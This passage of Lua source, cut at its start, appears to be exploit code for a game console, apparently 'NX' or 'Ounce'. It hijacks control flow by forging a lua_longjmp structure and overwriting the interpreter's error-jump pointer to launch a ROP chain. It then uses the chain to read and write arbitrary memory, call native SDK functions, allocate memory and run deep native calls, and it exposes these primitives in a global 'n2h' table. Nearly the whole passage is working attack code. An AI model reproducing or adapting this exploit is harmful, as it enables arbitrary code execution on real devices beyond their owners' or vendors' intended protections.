	-- Build and prepare the chain using the selected memory layout and callback.
	local function build_chain(area, emit)
		-- Create a new emitter with the specified memory boundaries.
		local E = new_emitter(area.chain, area.desc, area.desc_end, area.chain_end)

		-- Prepare the initial frame expected by the configured execution context.
		-- in chain builder we force the pc, sp, to the one of load x19 (used by g1)
		E:g1(0)
		-- Let the callback add the requested operations to the emitter.
		emit(E)
		-- Append the final context-unwind operation using the saved context.
		E:call3(sdk_base + offsets_sdk.longjmp, rop_backup, offsets_lua.lua_errrun, 0)

		-- Check that the generated chain does not exceed its allowed boundary.
		if E.cursor > E.chain_end then
			error("rop chain overlaps its end", 0)
		end
		-- Apply all queued memory writes and clear the pending write list.
		E:flush()
	end

	-- Creates a context builder with the selected memory layout.
	local function chain_builder(emit, chain_base, chain_end)
		-- Use the default memory layout.
		local area = main_area

		-- Override the chain area when custom boundaries are provided.
		if chain_base then
			area = {
				chain = chain_base,
				chain_end = chain_end,
				desc = heap + layout.main_calls,
				desc_end = heap + layout.main_calls + layout.main_calls_size
			}
		end
		-- Return a callback that receives the context captured by run_rop().
		return function(ctx)
			-- Preserve the captured context in a separate backup area.
			for off = 0, offsets_lua.jmpbuf_scan, 8 do
				w64(rop_backup + off, ctx.slots[off])
			end

			-- Prepare the emitter data using the selected memory layout.
			build_chain(area, emit)

			-- Prepare a copy of the jmp buf but with the lonjmp_b offset to simulate
			-- a lua_longjmp structure.
			for off = 0, offsets_lua.jmpbuf_scan, 8 do
				w64(rop_forged + longjmp_b + off, ctx.slots[off])
			end

			-- Overwrite the saved program counter with the one of g_load_x19 (the first
			-- gadget called in build_chain))
			w64(rop_forged + longjmp_b + ctx.pc_off, main_base + gadgets.g_load_x19)
			-- Overwrite the saved stack pointer with the base of the ROP chain prepared
			-- by the emitter.
			w64(rop_forged + longjmp_b + ctx.sp_off, area.chain)
			-- We write error in lua_longjmp.status to force luaD_rawrunprotected to
			-- return an error code to let the error handler repair the stack without
			-- crashing the process.
			w64(ctx.live + offsets_lua.lj_status, offsets_lua.lua_errrun)
		end
	end

	-- Start the ROP chain by overwriting the active lua_longjmp pointer with a forged one
	local function fire8(ctx)
		-- We overwrite the errojmp original lua_longjmp pointer
		-- with the forged one created by chain_builder
		w64(ctx.L + offsets_lua.errorjmp, rop_forged)
		-- We set errfunc to 0 to avoid calling an error handler
		-- (also the errfunc field was probably corrupted by w64 on the errorjmp)
		w64(ctx.L + offsets_lua.errfunc, 0)
		error("meow", 0)
	end

	-- Run the ROP chain
	-- CALLBACK FLOW:
	--
	-- 1. run_chain()
	--    Passes the build and fire callbacks to run_rop().
	--
	-- 2. run_rop()
	--    Creates the coroutine, captures the Lua execution context
	--    and invokes the supplied callbacks in sequence.
	--
	-- 3. build callback
	--    Calls chain_builder(), which returns a context-aware callback.
	--
	-- 4. chain_builder()
	--    Prepares the context-related memory structures and invokes
	--    build_chain() using the selected memory layout.
	--
	-- 5. build_chain()
	--    Creates the emitter, invokes emit(E) to describe the requested
	--    operations, performs the final checks and flushes queued writes.
	--
	-- 6. fire callback
	--    Invokes fire8() after the preparation phase.
	--
	-- 7. run_chain()
	--    Receives the coroutine result and handles reported errors.
	--
	-- MAIN IDEA:
	-- run_chain coordinates the process, run_rop manages the coroutine
	-- and callbacks, chain_builder prepares the context, and build_chain
	-- organizes the emitter operations.
	local function run_chain(emit, chain_base, chain_end)
		-- We call run_rop that prepares the context and also calls the chain_builder to prepare
		-- the ROP chain. Then
		local rok, rerr = run_rop{
			build = function(ctx)
				return chain_builder(emit, chain_base, chain_end)(ctx)
			end,
			fire = fire8,
			capture_jmpbuf = true
		}
		if not rok then
			print("[!] chain coroutine failed: " .. tostring(rerr))
		end
	end

	-- Call a native function with up to five arguments and return its result.
	local function native_call(target, a0, a1, a2, a3, a4, chain_base, chain_end)
		local RES = heap + layout.rop_result
		run_chain(function(E)
			E:call_native(target, a0, a1, a2, a3, a4, RES)
		end, chain_base, chain_end)
		-- We need to set the tag of the result cell to LUA_TNUMBER (3) to read it as a number
		w64(RES + 8, 3)
		return r64(RES)
	end

	local OUT = heap + layout.rop_ounce
	w64(OUT, 0)
	local is_ounce = native_call(sdk_base + offsets_sdk.svc_get_info,
		OUT, 32, 0xFFFF8001, 0, 0) == 0
	print("[*] running on:", is_ounce and "Ounce" or "NX")
	
	local RES = heap + layout.rop_result
	local node_probe = {}
	local node_probe_addr = addrof(node_probe)
	assert(node_probe_addr, "addrof(node probe) failed")
	run_chain(function(E)
		E:peek(node_probe_addr + 0x20, RES)
	end)
	w64(RES + 8, 3)
	local dummynode = r64(RES)
	assert(dummynode and dummynode ~= 0 and dummynode % 8 == 0,
		"could not read dummynode")
	w64(box_addr + 0x20, dummynode) -- node; the tag spills into lastfree
	w64(box_addr + 0x28, dummynode) -- lastfree; the tag spills into gclist

	-- TString* of a live string with no header writes at all: park it in the
	-- box's array slot 1 and read the raw eight bytes with the ROP peek.
	local function str_addr(s)
		assert(type(s) == "string", "str_addr wants a string")
		box[1] = s
		run_chain(function(E)
			E:peek(box_array, RES)
		end)
		w64(RES + 8, 3)
		local ts = r64(RES)
		box[1] = 0
		assert(ts and ts ~= 0, "str_addr read failed")
		return ts
	end

	local tls_addr = native_call(sdk_base + offsets_sdk.get_message_buffer_on_tls,
		0, 0, 0, 0, 0)
	print(string.format("[+] TPIDRRO_EL0=0x%x", tls_addr))

	local function wstr(addr, s)
		for i = 1, #s, 4 do
			local v = 0
			for j = 3, 0, -1 do
				v = v * 256 + (s:byte(i + j) or 0)
			end
			w64(addr + i - 1, v)
		end
	end

	local function alloc(size)
		return native_call(main_base + offsets_main.malloc, size, 0, 0, 0, 0)
	end

	local function free_block(ptr)
		run_chain(function(E)
			E:call3(main_base + offsets_main.free, ptr, 0, 0)
		end)
	end

	-- Deep SDK calls need a real stack: the default chain area is only a few
	-- hundred bytes.  Build the chain at the top of a 128 KiB block and let the
	-- callee grow down into the rest of it.
	local deep_stack
	local function call_deep(target, a0, a1, a2, a3, a4)
		if not deep_stack then
			deep_stack = alloc(0x20000)
			assert(deep_stack and deep_stack ~= 0, "deep stack allocation failed")
		end
		return native_call(target, a0, a1, a2, a3, a4,
			deep_stack + 0x1E000, deep_stack + 0x20000)
	end

	_G.n2h = {
		platform = is_ounce and "Ounce" or "NX",
		main_base = main_base,
		sdk_base = sdk_base,
		gadgets = gadgets,
		offsets_main = offsets_main,
		offsets_sdk = offsets_sdk,
		layout = layout,
		addrof = addrof,
		sdk = function(name)
			local va = offsets_sdk[name]
			assert(va, "unknown offset " .. tostring(name))
			return sdk_base + va
		end,
		peek = destructive_read,
		poke = w64,
		str_addr = str_addr,
		write_bytes = wstr,
		alloc = alloc,
		free = free_block,
		call_deep = call_deep,
		run_chain = run_chain,
		new_emitter = new_emitter,
		log = print,
	}
	collectgarbage("restart")
end

xpcall(setup, fatal)
